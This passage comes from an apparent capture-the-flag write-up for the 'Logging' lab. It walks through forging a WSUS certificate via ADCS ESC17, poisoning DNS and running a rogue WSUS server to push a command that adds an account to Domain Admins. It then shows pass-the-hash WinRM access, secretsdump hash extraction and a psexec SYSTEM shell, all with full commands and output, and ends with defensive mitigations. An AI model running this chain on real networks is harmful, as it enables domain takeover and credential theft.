b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgcEGCCsGAQUFBwEBBIG0

MIGxMIGuBggrBgEFBQcwAoaBoWxkYXA6Ly8vQ049bG9nZ2luZy1EQzAxLUNBLENO

PUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1D

b25maWd1cmF0aW9uLERDPWxvZ2dpbmcsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFz

ZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MA0GCSqGSIb3DQEB

CwUAA4ICAQBG+u0xrosH2TD4FzYAq29nNPKoUwlY7Wj3njuaYDzNCoiXzaPDK6f5

HP/v/B/0uyhu19wARg2/Xgoiysz4X3IFqyDMfBe1RQ2AZqPomFC2wrsM1j+a4IKQ

7y3k2lFgW5/QHlRIrzKfTvQBhtroBavvxFT2IS/jNS0AhEu5+2FiIc6qCC1dGYLq

Tar3pWlnxvF7ChtDVWOCKICDI6JN1aUGWAADS9wROf5XhtEt6Vfkj+MXtEOlGGC0

wYM+lwS2IHnOOlJqYzyl1PeFNGhOPqekN/uMaABvHhlnBV/lbrgEjC6c6SjIoTyb

XwNL9aBqp2krtIq8+DR2g+E5DNTQIOfvqzEzKW6Ed5QGG0PDWhkOPUoTeOgVK9cW

G+pyS9wP0uhK2ZElfDTfIVThtVdKFFl97Sp1SHq7bOpLaBguxNI+nNyvH/DJQl68

3wkBIuofhTtPVzxKuywU9RHSOezEF/DiucmGpTt8n3eFTRxqfKbw2v9kPDFkX0Bj

vFsCcGmqq68ZCSmp7Q7Sm+Wn2qCLusyGL6tBctSjTNitrfeZvYjZU26IPUSmXSLa

xg1EvEtJeuT4yr01nw0jAEfieJ9ZxekIJDJMvJ+6mAQ/MH3m0/UCFbUQe4wBzWb1

c3FRWKkt+MtvbWBoN9jWcqfJZEhHKZbgMyFspM5gY2KU9NQ724KL8Q==

\-----END CERTIFICATE-----

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

- 🔍 *We have successfully Obtained the Certificate, to ensure it, look at the altname parameter!*

- 🔍 *Now we need to save this context as .pem and then need to convert it into .pfx*

- 🔍 *after saving the context*

```text
openssl pkcs12 -in wsus.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out wsus.pfx

Enter Export Password:

Verifying - Enter Export Password:

(note:- you can set any random password for the certificate to be exported as pfx)
```

- 🔍 *Now we can connect the targets to our IP which are intended to go to the WSUS's IP*

> [!IMPORTANT]
> How and Why?

```text
\---> Clients asks for the real IP of WSUS server as they don't recognize wsus.logging.htb.

\---> DNS  Answers with an IP pointed to the wsus server

\---> clients then request for their desired updates from that server, they ensure the  server's Identity by the certificate.

.....Now Here's the catch

\----> Since we own the certificate for wsus, means whenever the clients asks for authentication of wsus server, we can handover the certificate

\---->  Before Authorizing we can add a DNS record for wsus to our IP

\----> whenever the client tries to connect to the wsus server, the request goes to our rogue server. and then we can simply authenticate our identity via the certificate

\---->  once we are authorized, we can feed them any malicious update!
```

- 🔍 *Now first we need to redirect the clients to our IP instead of the real WSUS's IP, we need add the DNS record*

```text
(note:- Before doing this, ensure you have exported the TGT properly, you can check it via klist)
```

- 🔍 *you can use bloodyAD as well as the native shell of CMD from meterpret as well*

```text
┌──(venv)─(root㉿fsocity)-[/home/kali]

└─# bloodyAD --host 10.129.245.130 -d logging.htb -k add dnsRecord wsus 10.10.15.169

[+] wsus has been successfully updated
```

- 🔍 *Once The record is added, ensure it via nslookup*

```text
nslookup wsus.logging.htb 10.129.245.130

Server:         10.129.245.130

Address:        10.129.245.130#53

Name:   wsus.logging.htb

Address: 10.10.15.169
```

- 🔍 *We are good to go now!*

- 🔍 *Now we need to extract the crt and key from the pfx file we got earlier and combine it in a single pem file*

```text
openssl pkcs12 -in wsus.pfx -clcerts -nokeys -out wsus.crt -nodes

openssl pkcs12 -in wsus.pfx -nocerts -out wsus.key -nodes

cat wsus.crt wsus.key > wsus_combined.pem

(note:- you must ensure that the wsus.logging.htb has the entry inside your /etc/hosts with your IP)
```

- 🔍 *now lets start the rogue wsus server with a command that adds msa_health to domain admins.*

```bash
sudo wsuks --serve-only \\

&#x20;   --WSUS-Server wsus.logging.htb \\

&#x20;   --tls-cert wsus.pem \\

&#x20;   -I tun0 \\

&#x20;   -c '/accepteula /s powershell.exe -ExecutionPolicy Bypass -Command "Add-ADGroupMember -Identity \\"Domain Admins\\" -Members \\"MSA_HEALTH$\\""'

&#x20;   __          __ _____  _    _  _  __  _____

&#x20;   \\ \\        / // ____|| |  | || |/ / / ____|

&#x20;    \\ \\  /\\  / /| (___  | |  | || ' / | (___

&#x20;     \\ \\/  \\/ /  \\___ \\ | |  | ||  <   \\___ \\

&#x20;      \\  /\\  /   ____) || |__| || . \\  ____) |

&#x20;       \\/  \\/   |_____/  \\____/ |_|\\_\\|_____/

&#x20;    Pentesting Tool for the WSUS MITM Attack

&#x20;              Made by NeffIsBack

&#x20;                version: 1.2.1

[+] Command to execute:

PsExec64.exe /accepteula /s powershell.exe -ExecutionPolicy Bypass -Command "Add-ADGroupMember -Identity \\"Domain Admins\\" -Members \\"MSA_HEALTH$\\""

[*] ===== Starting Web Server =====

[*] Using TLS certificate 'wsus.pem' for HTTPS WSUS Server

[*] Starting WSUS Server on 10.10.****.****:8531...

[*] Serving executable as KB: 5876493

[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetConfig"

[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie"

[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/SyncUpdates"

[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie"

[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetExtendedUpdateInfo"

[+] Received GET request: /a5ace7c0-c255-4db3-891d-c57a6b8c323e/PsExec64.exe

[+] GET request for exe: /a5ace7c0-c255-4db3-891d-c57a6b8c323e/PsExec64.exe
```

- 🔍 *The GET request for PsExec64 Ensures that the client has downloaded the Signed Binary*

- 🔍 *Now as we have attached the command that adds MSA_HEALTH$ to domain admins, we can use that same hash to get WinRM access*

```bash
evil-winrm -i dc01.logging.htb -u 'msa_health$' -H 603fc24ee01a9409f83c9d1d701485c5

*Evil-WinRM* PS C:\\Users\\msa_health$\\Documents> whoami /priv

PRIVILEGES INFORMATION

\----------------------

Privilege Name                            Description                                                        State

========================================= ================================================================== =======

SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled

SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled

SeSecurityPrivilege                       Manage auditing and security log                                   Enabled

SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled

SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled

SeSystemProfilePrivilege                  Profile system performance                                         Enabled

SeSystemtimePrivilege                     Change the system time                                             Enabled

SeProfileSingleProcessPrivilege           Profile single process                                             Enabled

SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled

SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled

SeBackupPrivilege                         Back up files and directories                                      Enabled

SeRestorePrivilege                        Restore files and directories                                      Enabled

SeShutdownPrivilege                       Shut down the system                                               Enabled

SeDebugPrivilege                          Debug programs                                                     Enabled

SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled

SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled

SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled

SeUndockPrivilege                         Remove computer from docking station                               Enabled

SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled

SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled

SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled

SeCreateGlobalPrivilege                   Create global objects                                              Enabled

SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled

SeTimeZonePrivilege                       Change the time zone                                               Enabled

SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled

SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

- 🔍 *now we can get the root flag from*

```text
*Evil-WinRM* PS C:\\users> dir toby.brynleigh\\desktop

&#x20;   Directory: C:\\users\\toby.brynleigh\\desktop

Mode                LastWriteTime         Length Name

\----                -------------         ------ ----

\-ar---        4/19/2026   1:16 PM             34 root.txt
```

- 🔍 *Domain Compromised!*

```text
\--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```

## Step 4 - Post Exploitation

- 🔍 *With the MSA_HEALTH being a member of domain admins, we can dump the hashes*

```text
secretsdump.py \\

&#x20;   -hashes :603fc24ee01a9409f83c9d1d701485c5 \\

&#x20;   'logging.htb/msa_health$@dc01.logging.htb'

[*] Querying offset from: logging.htb

[*] faketime -f format: +25205.852812

25205.852812s

[*] Running: secretsdump.py -hashes :603fc24ee01a9409f83c9d1d701485c5 logging.htb/msa_health$@dc01.logging.htb

/home/fsociety/.pyenv/versions/3.13.5/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for rem

oval as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.

&#x20; import pkg_resources

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Service RemoteRegistry is in stopped state

[*] Starting service RemoteRegistry

[*] Target system bootKey: 0x36936928a3ec7aa076d5b89ac8d4a1c1

[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)

**Administrator:500:aad3b435b51404eeaad3b435b51404ee:a0c1d1bed9126632f5f1f2b3f790bdb5:::**

Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
```

- 🔍 *Now lets ask for the TGT for administrator*

```text
getTGT.py logging.htb/Administrator \\

\-hashes ':a0c1d1bed9126632f5f1f2b3f790bdb5'

export KRB5CCNAME=Administrator.ccache
```

- 🔍 *Now lets acquire the shell*

```text
psexec.py -k -no-pass \\

&#x20;   'LOGGING.HTB/Administrator@dc01.logging.htb'

[*] Querying offset from: logging.htb

[*] faketime -f format: +25205.871961

25205.871961s

[*] Running: psexec.py -k -no-pass LOGGING.HTB/Administrator@dc01.logging.htb

/home/fsociety/.pyenv/versions/3.13.5/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.

html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.

&#x20; import pkg_resources

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on dc01.logging.htb.....

[*] Found writable share ADMIN$

[*] Uploading file BUwGuTPW.exe

[*] Opening SVCManager on dc01.logging.htb.....

[*] Creating service paOB on dc01.logging.htb.....

[*] Starting service paOB.....
```

> [!IMPORTANT]
> Press help for extra shell commands

```text
Microsoft Windows [Version 10.0.17763.8644]

(c) 2018 Microsoft Corporation. All rights reserved.

C:\\Windows\\system32> whoami

nt authority\\system
```

- 🔍 *Full Domain Compromised!*

## Mitigations & Security Perspective

> [!IMPORTANT]
> **🛡️ Blue Team Enterprise Active Directory Assessment**
> Below is the post-exploitation blueprint analyzing every vulnerability and administrative configuration issue exploited in the Logging lab. Each identified weakness is mapped to its core risk, threat context, and practical defensive remediation strategies.

### 🔴 Plaintext Credentials Exposed in Public SMB Shares

> [!WARNING]
> **Vulnerability Profile:**
> The `Logs` SMB share was readable by all standard domain users and contained trace files exposing administrative service credentials (`svc_recovery`).

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Exposing service credentials in plaintext allows low-privileged attackers to gain lateral movement within the directory, access critical services, and target AD delegation structures.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Remove read access on sensitive logs directories for non-administrative accounts.
> - **Remediation:** Implement automated log-scrubbing tools to strip plaintext credential strings from diagnostic traces.
> - **Detection:** Set up detection rules monitoring access to shared files containing standard password-revealing substrings (`BindPass`, `password=`).

---

### 🔴 Insecure AD Object Write Delegation (GenericWrite)

> [!WARNING]
> **Vulnerability Profile:**
> The `svc_recovery` account has write permissions (`GenericWrite`) over the `msa_health$` computer object.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> GenericWrite access permits attackers to write certificates to the `msDS-KeyCredentialLink` attribute (Shadow Credentials), obtaining TGT sessions as the target object via PKINIT and escalating privileges.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Remove direct `GenericWrite` and `WriteDacl` permissions over computer/service objects from standard or service accounts.
> - **Detection:** Perform regular BloodHound directory audits to identify administrative control loops. Monitor Event ID 5136 for edits matching `msDS-KeyCredentialLink`.

---

### 🔴 Insecure Scheduled Task Executing Unverified DLLs

> [!WARNING]
> **Vulnerability Profile:**
> The `UpdateMonitor` scheduled task extracts a zip archive located in a world-writable path (`C:\ProgramData`) and loads a DLL (`settings_update.dll`) without checking its code signature.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Standard users can drop arbitrary payloads into the zip path, leading to immediate DLL hijacking and arbitrary command execution in the context of the task executor (`jaylee.clifton`).

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Enforce code signing verification (Authenticode) on the update binary before loading external library DLLs.
> - **Remediation:** Set rigid folder permissions restricting writes to `C:\ProgramData\UpdateMonitor` only to administrative accounts.
> - **Detection:** Track and alert on suspicious DLL load anomalies inside application sub-bin paths using EDR tools.

---

### 🔴 ADCS Template ESC17 (Rogue WSUS Server Spoofing)

> [!WARNING]
> **Vulnerability Profile:**
> The `UpdateSrv` certificate template allows the enrollee to supply the Subject Alternative Name (SAN) and is marked for machine authentication with Server Authentication EKU.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Attackers can mint valid transport certificates for the domain's update server (`wsus.logging.htb`), poison DNS tables, and deploy a rogue WSUS server. This allows them to push malicious updates that execute commands as `SYSTEM` on computers contacting the update endpoint.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Disable the `ENROLLEE_SUPPLIES_SUBJECT` flag on certificate templates containing Server Authentication EKU.
> - **Remediation:** Secure WSUS settings to force SSL communication and validate update packages against explicit trusted certificates.
> - **Detection:** Monitor DNS zone transfers and active A-record modifications targeting WSUS hostnames.

